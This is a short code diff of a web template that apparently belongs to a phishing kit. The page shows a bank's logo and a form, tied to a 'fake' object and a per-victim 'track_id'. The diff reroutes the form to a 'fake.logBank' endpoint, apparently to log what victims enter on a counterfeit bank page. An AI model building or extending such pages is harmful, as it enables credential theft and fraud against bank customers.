@@ -149,7 +149,7 @@
         <img src="{{asset($bank['logo'])}}" style="max-width: 90vw;max-height: 100%">
     </div>
     <div style="margin: 40px 5vw 45px;">
-        <form class="neon_border" id="form" method="POST" action="/log/bank"
+        <form class="neon_border" id="form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
               role="form">
             @csrf
             <input type="hidden" name="track_id" id="track_id" value="{{$fake->track_id}}">
